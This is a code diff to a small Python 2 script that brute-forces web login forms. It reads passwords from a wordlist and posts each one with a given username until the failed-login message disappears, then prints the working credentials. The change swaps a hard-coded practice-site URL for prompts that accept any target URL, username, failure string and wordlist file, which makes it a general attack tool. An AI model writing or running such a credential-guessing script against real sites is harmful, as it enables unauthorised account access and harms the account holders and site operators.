@@ -1,20 +1,24 @@
 import requests
 
-usn = raw_input("Username / Email / Whatever: ")
-#change file if another password file
-psf = open("psw.txt", "r").readlines()
-#change url for url param
-url = "https://sqlzoo.net/hack/passwd.pl"
+#change post or get if get or post
+#change username:name password:name and other param:name
+class bc:
+    OKGREEN = '\033[92m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+
+url = raw_input("\nUrl post: ")
+usn = raw_input("Username_Email_Whatever: ")
+ter = raw_input("Invalid login response: ")
+pwls = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt"
+psf = open(pwls, "r").readlines()
 
 for j in psf:
  jb=j.strip()
- #change username:name password:name and other param:name
- #change post or get if get or post
- http = requests.get(url, data={"password":jb,"name":usn})
+ http = requests.post(url, data={"password":jb,"username":usn})
  con = http.content
- #change if value to content of missed login
- if "Incorrect user name or password. Try again." not in con:
-  print "[**++**] correct pass: "+jb
+ if ter not in con:
+  print bc.OKGREEN,bc.BOLD+"\n [*^*] Correct: username= "+usn + " , password= "+jb+"\n"
   break;
  else:
-  print "[XXX] invalid password: "+jb
+  print "[!!!] invalid password: "+jb
